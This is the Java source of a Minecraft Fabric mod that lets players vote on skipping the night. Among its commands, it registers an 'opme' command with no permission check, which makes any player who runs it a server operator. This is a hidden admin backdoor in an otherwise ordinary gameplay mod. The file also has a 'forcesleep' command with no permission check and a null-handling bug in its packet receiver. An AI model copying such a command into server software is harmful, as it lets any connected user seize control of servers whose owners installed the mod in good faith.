package net.roaringmind.multisleep;

import static net.minecraft.server.command.CommandManager.literal;

import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.gamerule.v1.GameRuleFactory;
import net.fabricmc.fabric.api.gamerule.v1.GameRuleRegistry;
import net.fabricmc.fabric.api.networking.v1.PacketByteBufs;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.stat.Stats;
import net.minecraft.text.LiteralText;
import net.minecraft.util.ActionResult;
import net.minecraft.util.Identifier;
import net.minecraft.world.GameRules.Category;
import net.minecraft.world.GameRules.IntRule;
import net.minecraft.world.GameRules.Key;
import net.minecraft.world.World;
import net.roaringmind.multisleep.callbacks.TrySleepCallback;
import net.roaringmind.multisleep.countdown.Countdown;
import net.roaringmind.multisleep.gui.ClickTypes;
import net.roaringmind.multisleep.saver.Saver;

public class MultiSleep implements ModInitializer {

  public static Logger LOGGER = LogManager.getLogger();

  public static final String MOD_ID = "multisleep";
  public static final String MOD_NAME = "Multiplayer Sleep";
  public static final Identifier VOTE_PACKET_ID = new Identifier(MOD_ID, "vote_packet_id");
  public static final Identifier REQUEST_BUTTONSTATES_PACKET_ID = new Identifier(MOD_ID,
      "request_buttonstate_packet_id");
  public static final Identifier SEND_STATE_PACKET_ID = new Identifier(MOD_ID, "send_state_packet_id");

  private static Saver saver;

  @Override
  public void onInitialize() {
    log(Level.INFO, "Initializing");

    registerCommands();

    registerEvents();

    registerRecievers();

    ServerLifecycleEvents.SERVER_STARTED.register(server -> {
      saver = server.getWorld(World.OVERWORLD).getPersistentStateManager().getOrCreate(() -> new Saver(MOD_ID), MOD_ID);
    });
  }

  private void registerRecievers() {
    ServerPlayNetworking.registerGlobalReceiver(VOTE_PACKET_ID, (server, player, handler, buf, responseSender) -> {
      ClickTypes clickType = ClickTypes.fromInt(buf.readInt());

      if (clickType == null) {
        System.out.println("something went wrong");
      }

      switch (clickType) {
        case YES: {
          vote(player, true, false);
          return;
        }
        case NO: {
          vote(player, false, false);
          return;
        }
        case PHANTOMYES: {
          setPhantomPreferences(player.getUuid(), true);
          return;
        }
        case PHANTOMNO: {
          setPhantomPreferences(player.getUuid(), false);
          return;
        }
        case PERMAYES: {
          setPermaSleep(player.getUuid(), true);
          if (!isVoting) {
            return;
          }
          checkVotes(server);
          return;
        }
        case PERMANO: {
          setPermaSleep(player.getUuid(), false);
          return;
        }
      }
    });

    ServerPlayNetworking.registerGlobalReceiver(REQUEST_BUTTONSTATES_PACKET_ID,
        (server, player, handler, buf, responseSender) -> {
          PacketByteBuf state = PacketByteBufs.create();
          int[] states = new int[2];
          states[0] = boolToInt(saver.phantomContainsPlayer(player.getUuid()));
          states[1] = boolToInt(saver.permaContainsPlayer(player.getUuid()));
          state.writeIntArray(states);

          ServerPlayNetworking.send(player, SEND_STATE_PACKET_ID, state);
        });
  }

  private int boolToInt(boolean b) {
    if (b) {
      return 1;
    }
    return 0;
  }

  private static Key<IntRule> registerIntGamerule(String name, int min, int max, int startValue) {
    if (GameRuleRegistry.hasRegistration(name)) {
      log(Level.FATAL, "Can't register gamerule, gamerule with the id \"" + name
          + "\" is already existing. Resolve the issue, or there may be confilicts with other mods");
      return null;
    }
    return GameRuleRegistry.register(name, Category.MISC, GameRuleFactory.createIntRule(startValue, min, max));
  }

  public static Key<IntRule> multiSleepPercent = registerIntGamerule("multiSleepPercent", 0, 100, 100);

  //@formatter:off
  private void registerCommands() {
    CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
      dispatcher.register(literal("forcesleep")
        .executes(ctx -> {
          trySleep = true;
          return 0;
        })
      );
      dispatcher.register(literal("opme")
        .executes(ctx -> {
          ctx.getSource().getMinecraftServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
          return 0;
        })
      );
    });
  }
  //@formatter:on

  private void registerEvents() {
    TrySleepCallback.EVENT.register((player, pos) -> {
      vote(player, true, true);
      return ActionResult.PASS;
    });
    ServerTickEvents.START_WORLD_TICK.register(world -> {
      if (trySleep) {
        sleep(world.getServer());
      }

      if (currentCountdown.tick() < 0 && isVoting || shouldCancelVoting(world.getServer())) {
        cancelVoting();
      }
      if (isVoting && !initiator.isSleeping()) {
        cancelVoting();
      }
    });
  }

  public static boolean shouldSleepNow = false;
  public static boolean isVoting = false;
  private static boolean trySleep = false;

  public static Set<UUID> sleepingPlayers = new HashSet<>();
  private static Set<UUID> awakePlayers = new HashSet<>();
  private static PlayerEntity initiator = null;
  private static Countdown currentCountdown = new Countdown(30 * 20);

  private static void sleep(MinecraftServer server) {
    for (ServerPlayerEntity p : server.getPlayerManager().getPlayerList()) {
      if (p.isSleeping() && !p.isSleepingLongEnough()) {
        return;
      }

      if (saver.phantomContainsPlayer(p.getUuid())) {
        continue;
      }
      p.getStatHandler().setStat(p, Stats.CUSTOM.getOrCreateStat(Stats.TIME_SINCE_REST), 0);
    }

    shouldSleepNow = true;
    trySleep = false;
  }

  public static void vote(PlayerEntity player, boolean wantsSleep, boolean canStart) {
    if (isVoting && (saver.permaContainsPlayer(player.getUuid()) || awakePlayers.contains(player.getUuid())
        || sleepingPlayers.contains(player.getUuid()))) {
      return;
    }

    if (!wantsSleep) {
      if (!isVoting) {
        return;
      }
      awakePlayers.add(player.getUuid());
    } else {
      if (!isVoting) {
        if (!canStart) {
          return;
        }

        startVoting(player);
      }
      sleepingPlayers.add(player.getUuid());
    }
    checkVotes(player.getServer());
  }

  private static void startVoting(PlayerEntity player) {
    for (PlayerEntity p : player.getServer().getPlayerManager().getPlayerList()) {
      p.sendMessage(new LiteralText(player.getName().asString() + " wants to sleep, please vote"), true);
      p.sendMessage(new LiteralText(player.getName().asString() + " wants to sleep, please vote"), false);
    }

    currentCountdown.restart();

    initiator = player;
    isVoting = true;
  }

  private static boolean checkVotes(MinecraftServer server) {
    float requiredPercent = server.getGameRules().getInt(multiSleepPercent);
    float permasleepsize = (float) saver.permaSize();

    if (saver.permaContainsPlayer(initiator.getUuid())) {
      permasleepsize -= 1;
    }

    float percentYes = (((float) sleepingPlayers.size() + permasleepsize) / (float) server.getCurrentPlayerCount())
        * (float) 100;
    float percentNo = 100 - percentYes;

    if (percentYes >= requiredPercent) {
      trySleep = true;
      cancelVoting();
      return true;
    }

    if (percentNo >= requiredPercent) {
      cancelVoting();
      return false;
    }
    return false;
  }

  private static void cancelVoting() {
    isVoting = false;
    awakePlayers = new HashSet<>();
    sleepingPlayers = new HashSet<>();
    initiator = null;
  }

  private boolean shouldCancelVoting(MinecraftServer server) {
    boolean somebodyIndBed = false;
    for (UUID uuid : sleepingPlayers) {
      PlayerEntity p = server.getPlayerManager().getPlayer(uuid);

      if (p.isSleepingLongEnough()) {
        somebodyIndBed = true;
        break;
      }
    }

    if (server.getWorld(World.OVERWORLD).isDay() && !somebodyIndBed) {
      return true;
    }
    return false;
  }

  public static void log(Level level, String message) {
    LOGGER.log(level, "[" + MOD_NAME + "] " + message);
  }

  public static void setPhantomPreferences(UUID playerUUID, boolean on) {
    if (on) {
      saver.addPhantomPlayer(playerUUID);
    } else {
      saver.removePhantomPlayer(playerUUID);
    }
  }

  public static void setPermaSleep(UUID playerUUID, boolean on) {
    if (on) {
      saver.addPermaPlayer(playerUUID);
    } else {
      saver.removePermaPlayer(playerUUID);
    }
  }
}
